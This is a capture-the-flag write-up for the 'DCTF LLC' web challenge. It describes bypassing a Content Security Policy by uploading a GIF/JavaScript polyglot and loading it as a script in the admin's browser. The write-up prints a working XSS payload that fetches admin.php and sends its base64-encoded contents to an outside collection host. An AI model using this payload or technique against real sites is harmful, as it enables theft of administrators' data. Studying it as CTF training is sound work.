## DCTF LLC

### Description
We are looking for your feedback about our new amazing company! :-) 
Target: https://llc.dctf-quals-17.def.camp/

*Update 11:00 EEST: Do you see what the "admin" is seeing?*

### Author: 
Andrei

### Stats: 
312 points / 21 solvers

### Solution

The challenge is to bypass CSP protection which is quite strong. 
The only way would be be to have a XSS that is executed on the administrator control panel and grab the flag, but the file upload is limited only to images. However you can notice that jquery.js.**MAP** is loaded with text/javascript flag which means that there is some misconfiguration.

####Step 1: 
Upload a file called exploit.js.gif with the following code (you can read more on this approach by searching GIF/Javascript polyglots):

```
GIF89a/**/=0;
$(document).ready(function() {
  $('<form method="get" id="frm" action="http://requestb.in/1j6n7fe1"><input type="text" id="content" name="content" value=""></form>')
    .appendTo('body');

  $.get("admin.php", function(data) { // this file can be found by loading the content of the bot.php?id=???
    $('#content').val(btoa(data));
    $('form').submit();
  });
});//; 
```

#### Step 2: 
Send a new request containing `<script src="link-to-the-exploit.js.gif"></script>`.
#### Step 3: 
Wait a few seconds. Profit.